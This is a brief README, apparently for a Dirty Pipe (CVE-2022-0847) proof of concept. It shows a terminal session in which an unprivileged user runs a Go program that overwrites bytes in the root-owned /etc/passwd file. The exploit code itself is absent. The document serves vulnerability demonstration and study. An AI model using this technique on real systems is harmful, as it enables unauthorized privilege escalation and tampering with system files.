# CVE-2022-0847
The Dirty Pipe Vulnerability

For educational purposes only

```
┌──(vagrant㉿kali)-[~]
└─$ ls -al /etc/passwd
-rw-r--r-- 1 root root 3124 Mar  8 08:47 /etc/passwd

┌──(vagrant㉿kali)-[~]
└─$ head -n 1 /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh

┌──(vagrant㉿kali)-[~]
└─$ echo foo > /etc/passwd
zsh: permission denied: /etc/passwd

┌──(vagrant㉿kali)-[~]
└─$ go run main.go /etc/passwd 1 foo
2022/03/08 08:48:03 It worked

┌──(vagrant㉿kali)-[~]
└─$ head -n 1 /etc/passwd
rfoo:x:0:0:root:/root:/usr/bin/zsh
```
